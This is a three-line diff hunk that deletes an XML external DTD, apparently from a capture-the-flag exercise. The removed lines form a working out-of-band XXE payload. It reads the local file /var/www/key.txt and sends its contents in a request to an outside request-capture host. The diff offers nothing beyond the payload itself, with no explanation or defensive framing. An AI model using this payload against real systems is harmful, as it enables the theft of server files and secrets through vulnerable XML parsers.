@@ -1,3 +1,0 @@
-<!ENTITY % data SYSTEM "file:///var/www/key.txt">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://ejlrywt.request.dreamhack.games/?%data;'>">
-%param1;
